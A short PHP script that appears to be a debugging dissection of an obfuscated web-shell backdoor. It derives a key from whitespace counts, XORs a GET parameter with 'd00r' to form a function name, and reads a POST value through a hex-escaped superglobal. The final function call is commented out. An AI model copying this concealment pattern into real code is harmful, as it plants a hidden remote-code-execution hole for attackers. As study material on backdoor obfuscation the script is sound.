     
                                   
<?php
// set_time_limit(3);
// ini_set('max_execution_time', 3);
// highlight_file(__FILE__);
$f = file(__FILE__);

$c2 = substr_count($f[1],chr(32));
$c  = chr($c2);
print 'c2: '. $c2 . "\n";
print 'c : '. $c . "\n";

$_GET[87] = "\x00\x00\x00\x00";
$_POST['#'] = "hello";

$x=(substr($_GET[87],0,4)^"d00r");
print 'x : '. $x . "\n";

$x2 = ${"_\x50\x4f\x53\x54"}{$c};
print 'param :'. $x2 . "\n";

// $x($x2);
